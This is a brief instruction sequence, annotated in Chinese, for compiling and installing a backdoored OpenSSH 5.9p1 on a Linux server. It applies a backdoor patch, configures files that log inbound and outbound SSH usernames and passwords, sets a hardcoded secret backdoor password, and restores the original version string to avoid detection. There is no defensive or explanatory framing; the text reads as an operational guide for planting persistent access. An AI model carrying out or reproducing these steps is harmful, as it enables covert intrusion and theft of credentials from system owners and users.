yum install  openssl openssl-devel zlib-devel  openssl openssl-devel pam-devel -y

tar zxvf openssh-5.9p1.tar.gz
tar zxvf openssh-5.9p1.patch.tar.gz

cp openssh-5.9p1.patch/sshbd5.9p1.diff   openssh-5.9p1

cd openssh-5.9p1   
patch < sshbd5.9p1.diff 




vi includes.h                  

/*
+#define ILOG "/tmp/ilog"                      //记录登录到本机的用户名和密码
+#define OLOG "/tmp/olog"                   //记录本机登录到远程的用户名和密码
+#define SECRETPW "123456654321"    		//你后门的密码
*/

vi version.h					//修改ssh版本信息，改成原来的


./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5
make && make install
service sshd restart 			//重启sshd

